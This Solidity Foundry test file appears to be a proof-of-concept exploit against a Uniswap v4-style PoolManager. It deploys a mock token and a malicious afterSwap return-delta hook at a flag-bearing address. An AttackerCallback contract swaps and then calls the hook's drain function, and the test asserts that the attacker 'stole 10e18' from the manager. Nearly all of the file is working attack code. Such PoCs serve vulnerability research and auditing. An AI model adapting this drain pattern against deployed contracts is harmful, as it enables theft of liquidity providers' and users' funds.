// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import {PoolManager} from "../src/PoolManager.sol";
import {IPoolManager} from "../src/interfaces/IPoolManager.sol";
import {PoolKey} from "../src/types/PoolKey.sol";
import {Currency} from "../src/types/Currency.sol";
import {Hooks} from "../src/libraries/Hooks.sol";
import {TickMath} from "../src/libraries/TickMath.sol";
import {SwapParams, ModifyLiquidityParams} from "../src/types/PoolOperation.sol";
import {MaliciousDeltaHook} from "./MaliciousDeltaHook.sol";

contract SimpleToken {
    mapping(address => uint256) public balanceOf;
    function mint(address to, uint256 amt) external { balanceOf[to] += amt; }
    function transfer(address to, uint256 amt) external returns (bool) { 
        balanceOf[msg.sender] -= amt; balanceOf[to] += amt; return true; 
    }
    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        balanceOf[from] -= amt; balanceOf[to] += amt; return true;
    }
    function approve(address, uint256) external pure returns (bool) { return true; }
}

contract AttackerCallback {
    IPoolManager public manager;
    PoolKey public key;
    MaliciousDeltaHook public hook;
    constructor(address _m, address _h) { manager = IPoolManager(_m); hook = MaliciousDeltaHook(_h); }
    function setKey(PoolKey memory _k) external { key = _k; }
    function attack() external { manager.unlock(abi.encode(1)); }
    function unlockCallback(bytes calldata) external returns (bytes memory) {
        SwapParams memory p = SwapParams(false, -0.1e18, TickMath.MAX_SQRT_PRICE - 1);
        manager.swap(key, p, "");
        hook.drain(10e18);
        return "";
    }
}

contract POC is Test {
    PoolManager public manager;
    MaliciousDeltaHook public hook;
    SimpleToken public token0; SimpleToken public token1;
    AttackerCallback public attacker;

    function setUp() public {
        token0 = new SimpleToken(); token1 = new SimpleToken();
        manager = new PoolManager(address(this));
        uint160 flags = uint160(Hooks.AFTER_SWAP_FLAG | Hooks.AFTER_SWAP_RETURNS_DELTA_FLAG);
        address hookAddr = address(uint160(0x1000000000000000000000000000000000000000) | flags);
        vm.etch(hookAddr, address(new MaliciousDeltaHook(address(manager))).code);
        hook = MaliciousDeltaHook(hookAddr);
        token0.mint(address(manager), 100e18); token1.mint(address(manager), 100e18);
        PoolKey memory key = PoolKey(Currency.wrap(address(token0)), Currency.wrap(address(token1)), 3000, 60, hook);
        hook.setCurrency1(Currency.wrap(address(token1)));
        manager.initialize(key, TickMath.getSqrtPriceAtTick(0));
        manager.modifyLiquidity(key, ModifyLiquidityParams(-60, 60, 10e18, bytes32(0)), "");
        attacker = new AttackerCallback(address(manager), address(hook));
        attacker.setKey(key); hook.setAttacker(address(attacker));
    }

    function test_afterSwapReturnDelta() public {
        uint beforePM = token1.balanceOf(address(manager));
        attacker.attack();
        uint afterPM = token1.balanceOf(address(manager));
        uint profit = token1.balanceOf(address(attacker));
        console.log("PM Loss:", beforePM - afterPM);
        console.log("Attacker Profit:", profit);
        assertLt(afterPM, beforePM, "PoolManager lost tokens");
        assertEq(profit, 10e18, "Attacker stole 10e18");
    }
}